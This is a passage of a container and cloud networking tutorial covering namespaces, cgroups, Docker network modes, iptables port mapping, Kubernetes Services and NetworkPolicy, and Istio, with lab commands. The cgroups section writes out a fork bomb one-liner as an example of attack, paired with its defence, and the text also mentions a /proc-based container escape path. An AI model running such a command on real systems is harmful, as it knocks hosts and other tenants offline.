CONTAINERS:
┌────────────────────────────────────────────────────────┐
│ Container 1    │ Container 2    │ Container 3          │
│ App A          │ App B          │ App C                │
│ Bins/Libs      │ Bins/Libs      │ Bins/Libs            │
├────────────────┴────────────────┴──────────────────────┤
│                Container Runtime (Docker/containerd)   │
├────────────────────────────────────────────────────────┤
│                    Host OS + Kernel (SHARED)           │
├────────────────────────────────────────────────────────┤
│                    Hardware                            │
└────────────────────────────────────────────────────────┘
Total for 3 apps: share 1 kernel = much less overhead

KEY DIFFERENCE: Containers share the HOST KERNEL.
  This is why:
  ✓ Containers start in milliseconds (VMs take minutes)
  ✓ Containers use ~50MB overhead (VMs use 2GB+)
  ✓ You can run 1000s of containers on one host
  ✗ Container security isolation is WEAKER than VM isolation
    (shared kernel = kernel vulnerability = all containers affected)
  ✗ Linux containers only run on Linux kernel
    (Docker on Windows/Mac runs a Linux VM underneath!)

When to use VM vs Container:
  VM: Strong isolation needed, untrusted multi-tenant workloads,
      different OSes required, legacy app that can't be containerized
  Container: Microservices, CI/CD pipelines, scalable apps,
             stateless services, developer environments
  Both: Containers running INSIDE VMs (standard cloud pattern)
        Kubernetes nodes are VMs (EC2 instances) running containers
```

---

## 14. Linux Primitives: Namespaces & cgroups

### The True Foundation of Containers

```
Docker, containerd, and all container runtimes are
just convenient wrappers around two Linux kernel features:

1. NAMESPACES: Isolation (what you CAN SEE)
2. CGROUPS: Resource limits (what you CAN USE)

No magic — containers are regular Linux processes
with namespace restrictions and resource limits.
```

### Linux Namespaces (Isolation Engine)

```
Linux has 8 namespace types. Each container gets its own:

1. PID NAMESPACE (Process IDs):
   Container sees its own PID tree starting from 1
   Container's PID 1 = host's PID 12345 (different on host)
   Processes in container CANNOT see host processes
   
   Demo:
   # On host: you can see docker processes
   ps aux | grep nginx
   # 12345 root nginx: master process
   
   # Inside container:
   docker exec -it mycontainer ps aux
   # PID 1 = nginx (container's private PID namespace)
   
   Escape: /proc/1/root/ symlink can expose host filesystem
   if container runs as root and proc is mounted!

2. NETWORK NAMESPACE:
   Each container gets its own network stack:
   - Its own network interfaces (eth0, lo)
   - Its own routing table
   - Its own iptables rules
   - Its own ports (each container can have port 80)
   
   This is why multiple containers can all bind to port 80.
   
   Demo:
   ip netns list                          # List network namespaces
   ip netns exec container1 ip addr       # Show interfaces in namespace
   
3. MOUNT NAMESPACE:
   Container has its own filesystem view
   Overlay filesystem: container's / is different from host's /
   
4. UTS NAMESPACE (Unix Time-Sharing):
   Container can have its own hostname
   docker run --hostname myapp ...
   
5. IPC NAMESPACE:
   Isolated inter-process communication
   Container can't access host's shared memory
   
6. USER NAMESPACE:
   Map container UIDs to host UIDs
   Container's root (UID 0) = host's UID 1000 (unprivileged!)
   This is critical for rootless containers
   
7. CGROUP NAMESPACE:
   Container sees its own cgroup hierarchy
   
8. TIME NAMESPACE (Linux 5.6+):
   Container can have different system time (rare use case)

Verify namespaces of a running container:
  docker inspect --format '{{.State.Pid}}' mycontainer
  # Get PID, e.g., 12345
  
  ls -la /proc/12345/ns/
  # Shows all namespace files for that process
  # net, pid, mnt, uts, ipc, user, cgroup
```

### cgroups (Resource Control Engine)

```
cgroups (Control Groups) limit and account for resource usage.

Without cgroups:
  One container could consume ALL CPU/RAM → starve other containers

With cgroups:
  Container A: max 2 CPUs, 512MB RAM
  Container B: max 1 CPU, 256MB RAM
  Container C: max 50% CPU, 1GB RAM

cgroup v1 hierarchy:
/sys/fs/cgroup/
  ├── cpu/           ← CPU scheduling
  ├── memory/        ← Memory limits
  ├── blkio/         ← Block I/O limits
  ├── net_cls/       ← Network traffic classification
  ├── devices/       ← Device access control
  └── freezer/       ← Pause/resume container

cgroup v2 (unified, modern, default in newer kernels):
/sys/fs/cgroup/
  └── system.slice/docker-<id>.scope/
        ├── memory.max         ← Memory limit
        ├── cpu.max            ← CPU quota/period
        ├── io.max             ← I/O limits
        └── pids.max           ← Max processes

Docker resource limits (which translate to cgroup entries):
docker run -d \
  --memory="512m" \                    # Memory limit
  --memory-swap="1g" \                 # Memory + swap
  --cpus="1.5" \                       # Max 1.5 CPU cores
  --cpu-shares=512 \                   # Relative CPU weight
  --blkio-weight=300 \                 # Disk I/O priority
  --pids-limit=100 \                   # Max processes/threads
  nginx

# Verify cgroup limits for a container:
CGROUP_PATH=/sys/fs/cgroup/system.slice
docker inspect --format '{{.Id}}' mycontainer
cat $CGROUP_PATH/docker-<id>.scope/memory.max

# Security attack: container without limits
# One malicious container consumes all RAM → OOM kills other containers
# Fork bomb without pids-limit: :(){ :|:& };:
# Defense: ALWAYS set resource limits in production
```

---

## 15. Docker Networking — All Modes

### Mode 1: Bridge Network (Default)

```
Docker's default network mode creates a private bridge network.

Host
├── docker0 bridge (172.17.0.1/16)
│   ├── Container 1 (172.17.0.2) ← veth pair → Container eth0
│   ├── Container 2 (172.17.0.3) ← veth pair → Container eth0
│   └── Container 3 (172.17.0.4) ← veth pair → Container eth0
│
└── eth0 (192.168.1.50) ← Host's physical NIC

Containers on same bridge:
  Can communicate with each other: YES (via bridge)
  Can reach internet: YES (via iptables MASQUERADE on docker0)
  Can be reached from host: YES
  Can be reached from LAN: ONLY if port published

Default bridge LIMITATION:
  Containers can only find each other by IP, not by name
  Better: Create user-defined bridge (containers find each other by name)

User-defined bridge (recommended):
  docker network create my-app-net
  docker run -d --network my-app-net --name web nginx
  docker run -d --network my-app-net --name db postgres
  
  # 'web' container can reach 'db' by hostname:
  docker exec web curl http://db:5432  # DNS by container name!
  
  This DNS resolution is Docker's built-in DNS server
  at 127.0.0.11 inside containers

Inspect bridge network:
  docker network inspect bridge
  ip addr show docker0
  brctl show docker0           # Show bridge and veth pairs
  ip link | grep veth          # List all veth interfaces
```

### Mode 2: Host Networking

```
Container uses the HOST's network stack directly.
No network namespace isolation for networking.

docker run -d --network host nginx
# nginx binds to HOST's port 80 directly
# No port mapping needed or possible

  Host Network Stack
  ├── eth0 (192.168.1.50) ← Container sees and uses this directly
  ├── Port 80 ← nginx bound here (no isolation)
  └── All host interfaces visible in container

Use case:
  - Maximum network performance (no veth overhead)
  - Container needs to modify host network config
  - Monitoring containers that need to see host traffic
  - When performance > isolation

Security concern:
  Container can see and potentially modify all host networking
  Container binding to a port = that port on the actual host
  Any port conflict with host services = failure
  If container is compromised, attacker can see all host network traffic
  
Performance use case (real example):
  High-frequency trading app: ~50 microsecond latency improvement
  using --network host over bridge networking
```

### Mode 3: None (Complete Network Isolation)

```
docker run -d --network none myapp

Container has only loopback interface (127.0.0.1).
NO network access whatsoever.
Cannot reach internet, cannot reach other containers, cannot be reached.

Use cases:
  - Batch processing jobs (input from volume, output to volume)
  - Air-gapped security scanning
  - Offline document processing
  - Security-sensitive workloads with no network requirement
```

### Mode 4: Container Network (Share Another Container's Network)

```
docker run -d --name web nginx
docker run -d --network container:web --name sidecar fluentd

Both containers share IDENTICAL network namespace:
  - Same IP address
  - Same ports
  - Same routing table
  - Same localhost

Use case: Sidecar pattern (Istio/Envoy proxy sidecar)
  Main app + Envoy proxy share network namespace
  Envoy intercepts all traffic on localhost
  Transparent proxy without app modification

Communication via localhost:
  App writes to localhost:8080
  Envoy intercepts on 0.0.0.0:8080 (same network namespace)
  Envoy applies policy, forwards to destination
```

### Mode 5: Macvlan — VM-like Networking for Containers

```
Container gets its own MAC address and directly connects to physical network.
Container appears as real device on physical LAN (like VM bridged mode).

docker network create -d macvlan \
  --subnet=192.168.1.0/24 \
  --gateway=192.168.1.1 \
  -o parent=eth0 \
  macvlan-net

docker run -d --network macvlan-net --ip 192.168.1.200 nginx

Container 192.168.1.200 is now directly on your LAN!
Physical router's DHCP or static IP — container appears as real host.

Limitation: Host cannot communicate with macvlan containers
            (kernel restriction — host and macvlan cannot be on same physical NIC)
Solution: Create a macvlan interface on host as well:
  ip link add mynet-shim link eth0 type macvlan mode bridge
  ip addr add 192.168.1.201/24 dev mynet-shim
  ip link set mynet-shim up

Use case: Legacy apps that expect to be on physical network,
          network appliances, IP cameras, IoT management containers
```

### Mode 6: Overlay Networks (Multi-Host, Swarm/Kubernetes)

```
Overlay networks connect containers across MULTIPLE HOSTS.

Host A (192.168.1.10)      Host B (192.168.1.11)
  Container 1 (10.0.0.2)    Container 2 (10.0.0.3)
       │                          │
       └────── VXLAN Tunnel ───────┘
         (UDP port 4789 encapsulation)

VXLAN (Virtual Extensible LAN):
  Encapsulates container Ethernet frames inside UDP packets
  Container-to-container traffic looks like UDP/4789 on underlay
  Outer IP: Host A → Host B (physical network routing)
  Inner payload: Container A's Ethernet frame to Container B
  
  VTEP (VXLAN Tunnel Endpoint): manages encap/decap
  VNI (VXLAN Network Identifier): like VLAN ID but 24-bit (16M segments)

Docker Swarm overlay:
  docker network create --driver overlay my-overlay
  Services on this network can communicate across hosts by name

Kubernetes CNI (Container Network Interface):
  Kubernetes doesn't implement networking itself
  Delegates to CNI plugins:
  
  Calico: BGP-based routing (no encapsulation), NetworkPolicy support
  Flannel: VXLAN or host-gw mode, simple, no NetworkPolicy
  Cilium: eBPF-based, L7 policy, Hubble observability, replaces kube-proxy
  Weave: Simple overlay, encryption by default
  
  CNI plugin requirements:
    Every Pod gets an IP address
    Every Pod can communicate with every other Pod (without NAT)
    Agents on nodes can communicate with all Pods
    
  Security: Kubernetes NetworkPolicy controls pod-to-pod communication
  Without NetworkPolicy: ALL pods can reach ALL pods (flat network)
```

---

## 16. How Ports Work in Containers

### The Complete Mental Model

```
Container port mapping: -p hostPort:containerPort

docker run -d -p 8080:80 nginx

What ACTUALLY happens (4 steps):

1. NAMESPACE:
   Nginx inside container binds to port 80 in its NETWORK NAMESPACE
   Container's port 80 ≠ Host's port 80 (different namespaces)
   Container can bind to any port without conflict with host

2. PORT BINDING ON HOST:
   Docker (via containerd + runc) creates iptables rule:
   docker-proxy process (or iptables DNAT) listens on host port 8080
   
   # What Docker adds to iptables:
   iptables -t nat -A DOCKER -p tcp --dport 8080 \
     -j DNAT --to-destination 172.17.0.2:80
     
   Destination NAT: Host:8080 → Container:172.17.0.2:80

3. REQUEST FLOW:
   curl http://host_ip:8080
   → Host receives SYN on port 8080
   → iptables PREROUTING: DNAT to 172.17.0.2:80
   → Packet routed to docker0 bridge
   → veth pair to container's network namespace
   → Container's kernel receives it on port 80
   → Nginx handles it

4. RESPONSE FLOW:
   Nginx responds: src=172.17.0.2:80, dst=client_ip:srcport
   → Exits container via veth pair → docker0 bridge
   → iptables POSTROUTING: MASQUERADE (src changed to host IP)
   → Host sends response to client

Verify port mapping internals:
  docker port mycontainer                    # Show port mappings
  iptables -t nat -L DOCKER -n -v           # See DNAT rules
  ss -tlnp | grep 8080                      # docker-proxy listening
  nsenter -t $(docker inspect --format '{{.State.Pid}}' mycontainer) \
    -n ss -tlnp                             # Ports inside container namespace
```

### Port Conflicts and Solutions

```
# Problem: Two containers want port 80 on host
docker run -d -p 80:80 --name web1 nginx  # OK
docker run -d -p 80:80 --name web2 nginx  # ERROR: port already in use

# Solution 1: Different host ports
docker run -d -p 8001:80 --name web1 nginx
docker run -d -p 8002:80 --name web2 nginx

# Solution 2: Put them on same user-defined network, use internal load balancer
docker run -d --name web1 --network app-net nginx
docker run -d --name web2 --network app-net nginx
docker run -d -p 80:80 --network app-net nginx:latest  # Nginx as LB

# Solution 3: Kubernetes (handles all port allocation automatically)
# Each pod gets its own IP — no port conflicts between pods

# Expose port range:
docker run -d -p 8000-8010:8000-8010 myapp

# Bind to specific host IP (security best practice):
docker run -d -p 127.0.0.1:8080:80 nginx  # Only accessible from localhost
# vs:
docker run -d -p 0.0.0.0:8080:80 nginx    # Accessible from all interfaces (default)
# vs:
docker run -d -p 8080:80 nginx             # Same as 0.0.0.0:8080:80 (risky in cloud!)
```

---

## 17. Container Networking Internals

### veth Pairs — The Container's Network Cable

```
A veth (virtual Ethernet) pair is like a patch cable:
  Two virtual interfaces connected back-to-back
  Anything sent on one end comes out the other end

For each container:
  HOST SIDE:    veth3a2b4c (connected to docker0 bridge)
  CONTAINER SIDE: eth0 (inside container network namespace)

When container sends packet:
  eth0 (in container namespace) → veth3a2b4c (in host namespace) → docker0 bridge

Show all veth pairs:
  ip link | grep veth
  ip -d link show veth3a2b4c  # Peer index shows container-side interface

Match veth to container:
  # Get container PID
  PID=$(docker inspect --format '{{.State.Pid}}' mycontainer)
  # Get interface index in container
  nsenter -t $PID -n ip link
  # Match index to host-side veth
  ip link | grep "master docker0"
```

### iptables: Docker's Traffic Manager

```
Docker heavily uses iptables for:
  - Container port publishing (DNAT)
  - Inter-container routing
  - Internet access (MASQUERADE)
  - Network isolation

Docker-created iptables chains:
  DOCKER:        Port publishing rules (DNAT)
  DOCKER-ISOLATE-STAGE-1: Prevents inter-network communication
  DOCKER-ISOLATE-STAGE-2: Same
  DOCKER-USER:   YOUR CUSTOM RULES (persists Docker restarts)

Full iptables state with Docker running:
  iptables -t nat -L -n -v     # NAT rules (DNAT/MASQUERADE)
  iptables -L -n -v            # Filter rules
  iptables -t nat -S            # All NAT rules in script format

Container internet access (MASQUERADE):
  iptables -t nat -A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE
  "Traffic from docker subnet, going OUT (not to docker0) → MASQUERADE"
  = NAT containers' IPs to host IP for internet access

Adding persistent firewall rules for Docker:
  # NEVER edit DOCKER chain — Docker overwrites it on restart
  # ALWAYS add rules to DOCKER-USER chain:
  iptables -I DOCKER-USER -i eth0 ! -s 10.0.0.0/8 -j DROP
  # Block external access to all containers except from 10.0.0.0/8
```

### eBPF — The Future of Container Networking

```
eBPF (extended Berkeley Packet Filter) is revolutionizing
container networking (Cilium, Calico eBPF mode).

Traditional path: Packet → NIC → iptables chains → Network stack → App
eBPF path:        Packet → NIC → eBPF program (in kernel) → App

eBPF programs are:
  - Small, sandboxed programs that run in kernel space
  - Verified before loading (no crashes, no infinite loops)
  - Event-driven (trigger on packet, syscall, tracepoint)
  - Can modify packets, redirect traffic, enforce policy

Why it's better for containers:
  iptables: O(n) rule matching (slower with more rules)
  eBPF:     O(1) hash table lookup (scales to millions of rules)
  
  iptables: No application-layer awareness
  eBPF:     Can inspect HTTP headers, DNS queries at kernel speed

Cilium uses eBPF to:
  - Replace kube-proxy (better performance)
  - Enforce NetworkPolicy at kernel level
  - Provide L7 policy (block specific HTTP paths)
  - Generate flow-level observability (Hubble)
  - Do transparent encryption (WireGuard integration)

View eBPF programs loaded by Cilium:
  bpftool prog list
  bpftool map list
  cilium status
  cilium monitor --type drop  # Real-time dropped packet reasons
```

---
# Cloud & DevOps Networking Deep Dive
## Sections 18–36 (Continuation from Container Networking Internals)

> **Cross-Reference:** Sections 1–17 covered on-prem migration rationale, virtualization internals, Docker networking, and container networking primitives (veth pairs, Linux bridge, iptables NAT). This document picks up at **Section 18: Kubernetes Networking** and carries through cloud attack surfaces.

> **Lab Disclaimer:** All offensive techniques described are for authorized, controlled environments only.

---

## 18. Kubernetes Networking Deep Dive

### Layman's Terms
Kubernetes is like running a **city with thousands of apartments (pods)**. Every apartment needs a unique address, apartments in different buildings (nodes) need to talk to each other, and visitors (external traffic) need a front door. Kubernetes networking solves all three problems — but in a way that's completely different from traditional networking.

### Real-World Analogy
Think of Kubernetes networking like a **hotel chain**:
- Every room (pod) has a unique internal extension number (pod IP)
- The hotel's switchboard (kube-proxy) routes calls to the right room
- Different hotels in the chain (nodes) can still reach each other's rooms
- The front desk (Ingress) handles external guests
- Room service (Services) abstracts which specific cook (pod) makes your food

### Formal Definition
Kubernetes networking is governed by the **CNI (Container Network Interface)** specification and four fundamental requirements:
1. Every pod gets a unique cluster-wide IP address
2. Pods can communicate with any other pod without NAT
3. Nodes can communicate with all pods without NAT
4. The IP a pod sees as its own is the same IP other pods see it as (no NAT masquerade within cluster)

### The Kubernetes Networking Stack

```
                    EXTERNAL TRAFFIC
                          │
                    ┌─────▼──────┐
                    │  Ingress   │  ← L7 HTTP routing (hostname/path)
                    │ Controller │    (Nginx, Traefik, AWS ALB)
                    └─────┬──────┘
                          │
              ┌───────────▼───────────┐
              │      Service (L4)     │  ← Stable virtual IP (ClusterIP/NodePort/LB)
              │  ClusterIP: 10.96.x.x │    kube-proxy manages iptables/IPVS rules
              └───────────┬───────────┘
                          │
        ┌─────────────────┼─────────────────┐
        │                 │                 │
   ┌────▼────┐       ┌────▼────┐       ┌────▼────┐
   │  Pod 1  │       │  Pod 2  │       │  Pod 3  │
   │10.244.0.2│      │10.244.1.3│      │10.244.2.4│
   │Node 1   │       │Node 2   │       │Node 3   │
   └─────────┘       └─────────┘       └─────────┘
   
   Pod IP ranges (example with Flannel):
     Node 1: 10.244.0.0/24
     Node 2: 10.244.1.0/24
     Node 3: 10.244.2.0/24
   Each node owns a /24 from the cluster CIDR (10.244.0.0/16)
```

### Kubernetes Service Types — Deep Dive

```
1. ClusterIP (default) — internal only:
   Virtual IP only reachable within cluster
   kube-proxy writes iptables DNAT rules: ClusterIP:port → PodIP:port
   
   apiVersion: v1
   kind: Service
   spec:
     type: ClusterIP
     clusterIP: 10.96.45.200      # Assigned from service CIDR
     ports:
       - port: 80                 # Service port
         targetPort: 8080         # Container port
     selector:
       app: myapp

2. NodePort — expose on every node's IP:
   Every cluster node opens a static port (30000–32767)
   External traffic → NodeIP:NodePort → ClusterIP → Pod
   
   spec:
     type: NodePort
     ports:
       - port: 80
         targetPort: 8080
         nodePort: 30080          # Open on ALL nodes
   
   Security issue: All nodes expose this port — even nodes not
   running this pod. Use NetworkPolicy to restrict.

3. LoadBalancer — cloud provider LB:
   Creates external cloud load balancer automatically
   AWS: creates NLB/CLB pointing to NodePorts
   GCP: creates TCP/UDP forwarding rule
   Azure: creates Azure Load Balancer
   
   spec:
     type: LoadBalancer
     # AWS annotation for NLB instead of CLB:
     annotations:
       service.beta.kubernetes.io/aws-load-balancer-type: "nlb"

4. ExternalName — DNS CNAME alias:
   Maps service to an external DNS name
   No proxying — just DNS CNAME
   Use case: reference external databases by internal name
   
   spec:
     type: ExternalName
     externalName: mydb.example.com  # Returns CNAME

5. Headless Service — no ClusterIP, direct pod DNS:
   clusterIP: None
   DNS returns actual pod IPs (not virtual IP)
   Use case: StatefulSets, databases, service discovery without LB
   
   DNS query: myservice.namespace.svc.cluster.local
   Returns: [pod1-ip, pod2-ip, pod3-ip] (all pods directly)
```

### kube-proxy Modes

```
1. iptables mode (default):
   kube-proxy watches API server for Service/Endpoint changes
   Writes iptables DNAT rules for every Service
   
   See the actual rules:
   sudo iptables -t nat -L KUBE-SERVICES -n --line-numbers
   sudo iptables -t nat -L KUBE-SVC-XXXXXXXX -n  # Per-service chain
   
   Problem: O(n) rule lookup — with 10,000 services, every packet
   traverses thousands of rules → CPU bottleneck
   
2. IPVS mode (better for large clusters):
   Uses Linux kernel IPVS (IP Virtual Server) — hash table O(1)
   Supports more LB algorithms: rr, wrr, lc, wlc, sh, dh
   
   Enable:
   kube-proxy --proxy-mode=ipvs --ipvs-scheduler=lc
   
   View IPVS rules:
   sudo ipvsadm -ln
   
3. eBPF mode (Cilium CNI):
   Bypasses iptables entirely
   Programs loaded directly into kernel via BPF
   Dramatically better performance at scale
   Native Kubernetes NetworkPolicy enforcement in kernel
```

### CNI Plugins — Comparison

```
CNI Plugin   | Overlay  | NetworkPolicy | Performance | Key Feature
─────────────────────────────────────────────────────────────────────
Flannel      | VXLAN    | No (needs Calico) | Medium  | Simple, easy setup
Calico       | BGP/VXLAN| Yes           | High        | BGP routing, enterprise
Weave        | VXLAN    | Yes           | Medium      | Encrypted by default
Cilium       | eBPF     | Yes (L7 too!) | Highest     | eBPF, L7 policy, Hubble
AWS VPC CNI  | None*    | Yes (via SGs) | Highest     | Pods get real VPC IPs
Azure CNI    | None*    | Yes           | Highest     | Native Azure VNet IPs

*AWS VPC CNI: No overlay! Each pod gets an actual ENI secondary IP.
 Pod IPs are VPC-routable — no tunnel overhead.
 Pods appear directly in VPC route tables.
 Security Groups apply directly to pods (not just nodes).
```

### Kubernetes DNS — CoreDNS

```
Every pod in a cluster gets DNS resolution via CoreDNS.

DNS naming convention:
  Service:  <service>.<namespace>.svc.<cluster-domain>
  Pod:      <pod-ip-dashes>.<namespace>.pod.<cluster-domain>
  
  Examples:
    nginx-service.default.svc.cluster.local       → ClusterIP
    10-244-1-5.production.pod.cluster.local       → Pod IP
    
  Short forms (within same namespace):
    nginx-service                                  → works
    nginx-service.production                       → cross-namespace
    
CoreDNS config (ConfigMap):
  kubectl get configmap coredns -n kube-system -o yaml
  
  # Custom stub zone (route internal.company.com to on-prem DNS):
  data:
    Corefile: |
      .:53 {
          kubernetes cluster.local in-addr.arpa ip6.arpa {
              pods insecure
              fallthrough in-addr.arpa ip6.arpa
          }
          forward . 8.8.8.8
      }
      internal.company.com:53 {
          forward . 10.0.0.53   # On-prem DNS server
      }

DNS-based service discovery:
  Applications don't need hardcoded IPs
  Just use: http://payment-service.payments.svc.cluster.local
  If pod scales or restarts, DNS updates automatically
  
DNS security concern:
  DNS rebinding via CoreDNS: attacker controls pod → queries internal DNS
  → Discovers all services in cluster
  Mitigation: Restrict pod DNS queries, use NetworkPolicy to limit pod egress
```

### NetworkPolicy — Kubernetes Firewall

```
By default: all pods can communicate with all pods (no firewall)
NetworkPolicy: L3/L4 policy scoped to pods via label selectors

# DENY ALL ingress to a namespace (default-deny):
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: production
spec:
  podSelector: {}          # Select ALL pods
  policyTypes:
  - Ingress                # Apply to ingress traffic
  # No ingress rules = deny all ingress

# Allow only frontend → backend on port 8080:
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
  namespace: production
spec:
  podSelector:
    matchLabels:
      role: backend
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          role: frontend
    ports:
    - protocol: TCP
      port: 8080

# Allow pods to reach external IP range (egress):
spec:
  podSelector:
    matchLabels:
      app: payment
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 10.0.0.0/8
        except:
        - 10.100.0.0/16   # Exclude this range
    ports:
    - port: 5432          # PostgreSQL only

# Cilium advantage: L7 NetworkPolicy
# Block specific HTTP paths even to allowed pods:
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
spec:
  endpointSelector:
    matchLabels:
      role: backend
  ingress:
  - fromEndpoints:
    - matchLabels:
        role: frontend
    toPorts:
    - ports:
      - port: "8080"
      rules:
        http:
        - method: "GET"
          path: "/api/.*"    # Only allow GET /api/* — block everything else
```

### Hands-On Lab: Kubernetes Networking Internals

```bash
# Setup: minikube or kind (Kubernetes in Docker)
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube
minikube start --driver=docker --cni=calico

# Deploy test pods
kubectl run pod-a --image=nicolaka/netshoot --command -- sleep 3600
kubectl run pod-b --image=nicolaka/netshoot --command -- sleep 3600
kubectl wait --for=condition=Ready pod/pod-a pod/pod-b

# Get pod IPs
kubectl get pods -o wide

# Exec into pod and test connectivity
kubectl exec -it pod-a -- bash
  # Inside pod:
  ip addr show eth0          # Pod's veth end
  ip route show              # Default route through node
  ping <pod-b-ip>            # Direct pod-to-pod
  curl http://kubernetes.default.svc.cluster.local  # API server via DNS
  nslookup kubernetes.default.svc.cluster.local     # DNS resolution
  cat /etc/resolv.conf       # Points to CoreDNS ClusterIP

# On the node — see veth pairs
minikube ssh
  ip link show | grep veth   # All veth pairs (one per pod)
  brctl show                 # Linux bridge connecting them (if Flannel/Calico)
  sudo iptables -t nat -L KUBE-SERVICES -n  # All service rules
  sudo ipvsadm -ln           # If IPVS mode

# Apply NetworkPolicy and verify isolation
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector:
    matchLabels:
      run: pod-b
  policyTypes:
  - Ingress
EOF

# Now pod-a can no longer reach pod-b:
kubectl exec -it pod-a -- ping <pod-b-ip>  # Should time out

# Trace packet path with Cilium Hubble (if using Cilium):
hubble observe --pod pod-a --follow
```

---

## 19. Service Mesh — Istio & Envoy

### Layman's Terms
Imagine every apartment in your city needs to: encrypt its phone calls, keep a log of who called who, limit how many calls it accepts per minute, and automatically retry failed calls. Without a service mesh, every apartment (microservice) has to build all this themselves. A service mesh is a **dedicated communication infrastructure layer** — a tiny "phone company proxy" injected next to every apartment that handles all of this transparently.

### Real-World Event
Netflix, Uber, and Lyft all independently built service mesh concepts around 2015–2016 because microservice-to-microservice communication became their #1 operational challenge. Lyft open-sourced Envoy in 2016. Google, IBM, and Lyft co-created Istio in 2017. Today, large-scale microservice deployments without a service mesh are considered an operational risk.

### Formal Definition
A service mesh is a dedicated infrastructure layer that handles service-to-service communication in a microservice architecture. It is implemented as a network of **sidecar proxies** (typically Envoy) deployed alongside each service instance, controlled by a centralized **control plane** (Istio's istiod). It provides traffic management, mutual TLS (mTLS), observability, and policy enforcement — transparently, without code changes.

### Architecture

```
WITHOUT Service Mesh:
  Service A ──HTTP──► Service B
  Service A must handle: retries, timeouts, TLS, circuit breaking, metrics

WITH Service Mesh (Sidecar pattern):
  
  ┌─────────────────────────┐      ┌─────────────────────────┐
  │  Pod A                  │      │  Pod B                  │
  │  ┌──────────┐           │      │  ┌──────────┐           │
  │  │ App Code │           │      │  │ App Code │           │
  │  │ (port 8080)◄────────────────────►(port 8080)          │
  │  └──────────┘  ↑        │      │  └──────────┘  ↑       │
  │                │        │      │                │        │
  │  ┌─────────────┴──────┐ │      │ ┌──────────────┴─────┐ │
  │  │  Envoy Sidecar     │ │      │ │  Envoy Sidecar     │ │
  │  │  (iptables intercepts        │ │  (iptables intercepts│
  │  │   ALL pod traffic) │ │      │ │   ALL pod traffic) │ │
  │  └────────────────────┘ │      │ └────────────────────┘ │
  └─────────────────────────┘      └─────────────────────────┘
                    │                          │
                    └──── mTLS encrypted ──────┘
                          (app sees plaintext,
                           sidecar handles TLS)
  
  Control Plane (istiod):
    - Pushes xDS config to all Envoy sidecars
    - Issues/rotates mTLS certificates (SPIFFE/SPIRE)
    - Enforces AuthorizationPolicy
    - Aggregates telemetry
```

### Istio Traffic Management

```yaml
# VirtualService — Traffic routing rules
apiVersion: networking.istio.io/v1alpha3
kind: VirtualService
metadata:
  name: payment-service
spec:
  hosts:
  - payment-service
  http:
  - match:
    - headers:
        x-canary:
          exact: "true"
    route:
    - destination:
        host: payment-service
        subset: v2           # 100% of canary-header traffic → v2
  - route:
    - destination:
        host: payment-service
        subset: v1
      weight: 90             # 90% → v1
    - destination:
        host: payment-service
        subset: v2
      weight: 10             # 10% → v2 (canary rollout)

# DestinationRule — connection pool, circuit breaker
apiVersion: networking.istio.io/v1alpha3
kind: DestinationRule
metadata:
  name: payment-service
spec:
  host: payment-service
  subsets:
  - name: v1
    labels:
      version: v1
  - name: v2
    labels:
      version: v2
  trafficPolicy:
    connectionPool:
      tcp:
        maxConnections: 100        # Circuit breaker: max 100 connections
      http:
        http2MaxRequests: 1000
        pendingRequests: 100       # Queue limit — beyond this = 503
    outlierDetection:
      consecutiveErrors: 5        # After 5 errors → eject pod
      interval: 30s
      baseEjectionTime: 30s       # Ejected for 30s minimum

# PeerAuthentication — enforce mTLS
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT   # Reject any non-mTLS connection in this namespace

# AuthorizationPolicy — L7 RBAC
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payment-authz
  namespace: production
spec:
  selector:
    matchLabels:
      app: payment-service
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/production/sa/checkout-service"]
  - to:
    - operation:
        methods: ["POST"]
        paths: ["/api/payment"]
  # Only checkout-service SA can POST /api/payment — deny everything else
```

### Envoy Deep Dive

```
Envoy is the data plane proxy — every sidecar IS an Envoy instance.

Envoy concepts:
  Listener:    Where Envoy accepts connections (e.g., 0.0.0.0:15001)
  Cluster:     Upstream service (pool of endpoints)
  Route:       Rules mapping requests to clusters
  Endpoint:    Individual backend instance (pod IP:port)
  Filter chain: Pipeline of filters processing each request

xDS APIs (how Istio configures Envoy dynamically):
  LDS: Listener Discovery Service
  RDS: Route Discovery Service
  CDS: Cluster Discovery Service
  EDS: Endpoint Discovery Service
  SDS: Secret Discovery Service (certificates)
  
  Envoy polls istiod for updates — config changes in seconds
  No restart needed — hot-reload of config

Envoy observability (built-in):
  /stats: Counters/gauges/histograms for every connection
  /config_dump: Full current config in JSON
  /clusters: All upstream cluster health
  
  kubectl exec -it pod-a -c istio-proxy -- \
    curl localhost:15000/stats | grep upstream_rq_2xx

Envoy admin port: 15000 (sidecar admin)
Inbound listener:  15006 (intercepts inbound to app)
Outbound listener: 15001 (intercepts outbound from app)
iptables rule Istio injects:
  -A ISTIO_REDIRECT -p tcp -j REDIRECT --to-ports 15001
  (ALL outbound TCP → Envoy port 15001)
```

### Hands-On Lab: Istio in Minikube

```bash
# Install Istio
curl -L https://istio.io/downloadIstio | sh -
export PATH=$PWD/istio-*/bin:$PATH
istioctl install --set profile=demo -y

# Enable sidecar injection for default namespace
kubectl label namespace default istio-injection=enabled

# Deploy sample app
kubectl apply -f istio-*/samples/bookinfo/platform/kube/bookinfo.yaml
kubectl apply -f istio-*/samples/bookinfo/networking/bookinfo-gateway.yaml

# Verify sidecars injected (2/2 containers per pod)
kubectl get pods  # Should show 2/2 READY

# View Envoy config for a pod
kubectl exec -it $(kubectl get pod -l app=productpage -o jsonpath='{.items[0].metadata.name}') \
  -c istio-proxy -- pilot-agent request GET config_dump | python3 -m json.tool | less

# View mTLS status
